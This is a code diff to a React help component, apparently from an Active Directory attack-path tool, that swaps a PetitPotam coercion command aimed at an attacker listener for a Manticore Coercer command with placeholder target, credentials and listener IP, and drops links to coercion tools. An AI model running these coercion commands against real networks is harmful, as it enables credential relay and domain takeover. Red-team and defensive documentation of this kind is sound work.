@@ -46,34 +46,20 @@ const LinuxAbuse: FC = () => {
                     href='https://github.com/p0dalirius/windows-coerced-authentication-methods'>
                     Windows Coerced Authentication Methods
                 </Link>
-                . Examples of tools include:
-                <ul style={{ paddingLeft: '1.5em' }}>
-                    <li>
-                        <Link target='_blank' rel='noopener noreferrer' href='https://github.com/p0dalirius/Coercer'>
-                            Coercer.py
-                        </Link>
-                    </li>
-                    <li>
-                        <Link
-                            target='_blank'
-                            rel='noopener noreferrer'
-                            href='https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py'>
-                            printerbug.py
-                        </Link>
-                    </li>
-                    <li>
-                        <Link target='_blank' rel='noopener noreferrer' href='https://github.com/topotam/PetitPotam'>
-                            PetitPotam
-                        </Link>
-                    </li>
-                </ul>
+                .
             </Typography>
             <Typography variant='body2'>
-                To trigger WebClient coercion (instead of regular SMB coercion), the listener must use a WebDAV
-                Connection String format: <code>\\SERVER_NETBIOS@PORT/PATH/TO/FILE</code>. Example:
+                Every coercion technique has prerequisites that must be met on the target. The following command uses{' '}
+                <Link target='_blank' rel='noopener noreferrer' href='https://github.com/TheManticoreProject/coercer'>
+                    Manticore Coercer
+                </Link>{' '}
+                to attempt all relevant SMB coercion techniques. Success depends on the prerequisites for at least one
+                technique being met.
             </Typography>
             <Typography component={'pre'}>
-                {'Petitpotam.py -d "DOMAIN" -u "USER" -p "PASSWORD" "ATTACKER_NETBIOS@PORT/file.txt" "VICTIM_IP"'}
+                {
+                    'manticore-coercer coerce -t <target> -u <user> -p <pass> -d <domain> -l <listener-ip> --always-continue --path-type smb'
+                }
             </Typography>
 
             <Typography variant='body1'>3. Perform Certificate Authentication</Typography>
